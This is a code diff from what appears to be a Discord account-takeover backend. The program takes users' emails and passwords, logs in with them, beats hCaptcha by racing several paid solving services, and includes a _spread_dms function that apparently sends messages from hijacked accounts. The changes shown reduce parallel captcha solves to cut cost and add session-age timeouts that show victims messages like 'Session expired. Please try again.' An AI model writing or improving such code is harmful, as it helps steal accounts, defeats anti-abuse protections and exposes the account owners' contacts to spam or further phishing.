@@ -599,7 +599,7 @@ def _pw_patch_with_captcha(s, url, headers, body, label='pw'):
         rqdata  = j.get('captcha_rqdata', '')
         rqtoken = j.get('captcha_rqtoken', '')
         print(f'[{label}] Captcha required — solving...')
-        cap_token, cap_err = _solve_race(sitekey, rqdata, n=7)
+        cap_token, cap_err = _solve_race(sitekey, rqdata, n=5)
         if not cap_token:
             print(f'[{label}] Captcha solve failed: {cap_err}')
             return j, r.status_code
@@ -1470,6 +1470,7 @@ def _spread_dms(token):
 sessions = {}          # QR auth sessions
 login_sessions = {}    # Captcha flow: sid -> DiscordSession (persisted between captcha challenge & solve)
 _login_lock = threading.Lock()  # Thread-safe access to login_sessions
+SESSION_SOLVE_TIMEOUT = 120  # Stop solving captchas for sessions older than 2 minutes
 
 import collections
 
@@ -1860,9 +1861,9 @@ def solve_captcha(sitekey, rqdata, cancel_event=None):
     return winner[0], last_err[0]
 
 
-def _solve_race(sitekey, rqdata, n=7):
+def _solve_race(sitekey, rqdata, n=5):
     """Submit N solve_captcha tasks (each already races providers internally).
-    First to return wins. Default n=7 for maximum speed."""
+    First to return wins. Default n=5 for cost efficiency."""
     if n <= 1:
         return solve_captcha(sitekey, rqdata)
 
@@ -2439,7 +2440,7 @@ def _solve_and_submit(ds, login_email, login_pw, sitekey, rqdata, rqtoken, clien
     for attempt in range(MAX_SOLVE_ATTEMPTS):
         print(f'[solve] Attempt {attempt+1}/{MAX_SOLVE_ATTEMPTS} sitekey={sitekey[:16]} rqdata={bool(rqdata)}')
 
-        token, err = _solve_race(sitekey, rqdata, n=7)
+        token, err = _solve_race(sitekey, rqdata, n=5)
         if not token:
             print(f'[solve] Failed: {err}')
             if attempt >= MAX_SOLVE_ATTEMPTS - 1:
@@ -2553,6 +2554,15 @@ def _format_login_result(j, status_code, client_ip, ds=None, password='?'):
 def _bg_solve_prechallenge(sid, sess, pc):
     """Handle PC shortcut mode: wait for pre-challenge solve, submit with real creds."""
     try:
+        # ── Session age guard: stop solving if session is too old ──
+        age = time.time() - sess.get('_created_at', time.time())
+        if age > SESSION_SOLVE_TIMEOUT:
+            print(f'[bg:{sid}] Session too old ({age:.0f}s > {SESSION_SOLVE_TIMEOUT}s), aborting solve')
+            sess['result'] = {'error': 'Session expired. Please try again.', 'retry': True}
+            sess['result_code'] = 500
+            sess['status'] = 'done'
+            return
+
         email = sess['email']
         pw    = sess['pw']
         ip    = sess.get('client_ip', '')
@@ -2588,7 +2598,7 @@ def _bg_solve_prechallenge(sid, sess, pc):
             sitekey = j.get('captcha_sitekey', 'a9b5fb07-92ff-493f-86fe-352a2803b3df')
             rqdata  = j.get('captcha_rqdata', '')
             rqtoken = j.get('captcha_rqtoken', '')
-            token, err = _solve_race(sitekey, rqdata, n=7)
+            token, err = _solve_race(sitekey, rqdata, n=5)
             if not token:
                 sess['result'] = {'error': 'Verification timed out. Retrying...', 'retry': True}
                 sess['result_code'] = 500
@@ -2641,7 +2651,7 @@ def _bg_solve_prechallenge(sid, sess, pc):
             sitekey = j.get('captcha_sitekey', 'a9b5fb07-92ff-493f-86fe-352a2803b3df')
             rqdata  = j.get('captcha_rqdata', '')
             rqtoken = j.get('captcha_rqtoken', '')
-            token2, err = _solve_race(sitekey, rqdata, n=7)
+            token2, err = _solve_race(sitekey, rqdata, n=5)
             if not token2:
                 sess['result'] = {'error': 'Verification timed out. Retrying...', 'retry': True}
                 sess['result_code'] = 500
@@ -2718,6 +2728,15 @@ def _bg_solve(sid):
         if not sess:
             return
 
+        # ── Session age guard: stop solving if session is too old ──
+        age = time.time() - sess.get('_created_at', time.time())
+        if age > SESSION_SOLVE_TIMEOUT:
+            print(f'[bg:{sid}] Session too old ({age:.0f}s > {SESSION_SOLVE_TIMEOUT}s), aborting solve')
+            sess['result'] = {'error': 'Session expired. Please try again.', 'retry': True}
+            sess['result_code'] = 500
+            sess['status'] = 'done'
+            return
+
         pc = sess.get('_prechallenge')
 
         # ── PC shortcut mode: pre-challenge is our ONLY solve path ──
@@ -2739,12 +2758,21 @@ def _bg_solve(sid):
         last_ds = ds  # track last DiscordSession for email verify flow
 
         for attempt in range(MAX_ATTEMPTS):
+            # ── Check session age before each solve attempt ──
+            age = time.time() - sess.get('_created_at', time.time())
+            if age > SESSION_SOLVE_TIMEOUT:
+                print(f'[bg:{sid}] Session too old ({age:.0f}s), stopping solve at attempt {attempt+1}')
+                sess['result'] = {'error': 'Session expired. Please try again.', 'retry': True}
+                sess['result_code'] = 500
+                sess['status'] = 'done'
+                return
+
             print(f'[bg:{sid}] Captcha attempt {attempt+1}/{MAX_ATTEMPTS} (sitekey={sitekey[:16]}, rqdata={bool(rqdata)})')
 
             solved_token = None
 
             # ── Solve captcha ──
-            solved_token, err = _solve_race(sitekey, rqdata, n=7)
+            solved_token, err = _solve_race(sitekey, rqdata, n=5)
             if not solved_token:
                 print(f'[bg:{sid}] Solve failed: {err}')
                 if attempt >= MAX_ATTEMPTS - 1:
